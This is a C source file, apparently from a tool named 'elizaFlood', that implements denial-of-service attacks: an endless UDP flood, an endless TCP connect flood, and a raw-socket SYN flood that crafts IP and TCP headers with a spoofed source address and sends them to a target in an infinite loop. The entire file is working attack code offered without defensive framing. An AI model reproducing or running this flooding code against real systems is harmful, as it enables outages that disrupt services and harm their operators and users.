#include "elizaFlood.h"

unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}

void udp_flood(char* ip, int port, char* message, int verbose) {
	int sockfd;
    int n, len;
    char buffer[1024];
    char *hello = "Eliza says hello, friend.";
	struct sockaddr_in     servaddr;

	memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.s_addr = inet_addr(ip);

    if((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }
	if(verbose == 1) {
    	printf("Flooding now...\n");
	}
	while(1) {
    	sendto(sockfd, (const char *)hello, strlen(hello), MSG_CONFIRM, (const struct sockaddr *) &servaddr, sizeof(servaddr));
    }
}
void tcp_flood(char* ip, int port, char* message, int verbose) {
	int sockfd;
    int n, len;
    char buffer[1024];
    char *hello = "Eliza says hello, friend.";
	struct sockaddr_in     servaddr;

	memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.s_addr = inet_addr(ip);

	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	if(connect(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	printf("Flooding now...\n");
	while(1) {
		write(sockfd, hello, sizeof(hello));
	}
}
void tcpsyn_flood(char* ip, int port, char* message, int verbose) {
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	char datagram[4096] , source_ip[32];
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;

	strcpy(source_ip , "192.168.1.2");

	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.s_addr = inet_addr(ip);

	memset (datagram, 0, 4096);

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons(54321);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(source_ip);
	iph->daddr = sin.sin_addr.s_addr;

	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

	tcph->source = htons (1234);
	tcph->dest = htons (80);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons (5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

	memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));

	tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	printf("Flooding now...\n");
	while(1) {
		if(sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
			printf("ERROR!\n");
		}
	}
}
